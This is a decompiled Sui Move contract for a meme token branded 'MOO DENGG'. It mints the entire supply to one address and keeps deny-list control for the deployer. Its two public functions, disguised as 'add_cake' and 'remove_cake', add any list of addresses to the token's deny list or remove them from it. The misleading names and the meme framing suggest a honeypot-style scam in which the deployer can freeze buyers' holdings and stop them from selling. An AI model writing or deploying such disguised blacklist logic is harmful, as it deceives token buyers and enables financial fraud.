module 0x92d3065973ac9834f6d1cd64348b634b502546ad93024ee7037f51663c8c8562::Token {
    struct TOKEN has drop {
        dummy_field: bool,
    }

    public fun add_cake(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<TOKEN>, arg2: vector<address>, arg3: &mut 0x2::tx_context::TxContext) {
        let v0 = 0;
        loop {
            0x2::coin::deny_list_v2_add<TOKEN>(arg0, arg1, *0x1::vector::borrow<address>(&arg2, v0), arg3);
            v0 = v0 + 1;
            if (v0 >= 0x1::vector::length<address>(&arg2)) {
                break
            };
        };
    }

    fun init(arg0: TOKEN, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<TOKEN>(arg0, 9, b"MOODENGG", b"MOO DENGG", b"just a viral lil hippo", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://pink-naval-kingfisher-12.mypinata.cloud/ipfs/QmZVXXUHFx7V3djJNSXXuoX8RfVChkbQXDa7223SFQGC5f"))), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<TOKEN>>(v2);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<TOKEN>>(v1, 0x2::tx_context::sender(arg1));
        0x2::coin::mint_and_transfer<TOKEN>(&mut v3, 1000000000000000000, @0xf1c831a889f5745f630278b51e4f91e420cdcd1694dbcc3ab3d6d2bb786a4bb0, arg1);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<TOKEN>>(v3);
    }

    public fun remove_cake(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<TOKEN>, arg2: vector<address>, arg3: &mut 0x2::tx_context::TxContext) {
        let v0 = 0;
        loop {
            0x2::coin::deny_list_v2_remove<TOKEN>(arg0, arg1, *0x1::vector::borrow<address>(&arg2, v0), arg3);
            v0 = v0 + 1;
            if (v0 >= 0x1::vector::length<address>(&arg2)) {
                break
            };
        };
    }

    // decompiled from Move bytecode v6
}

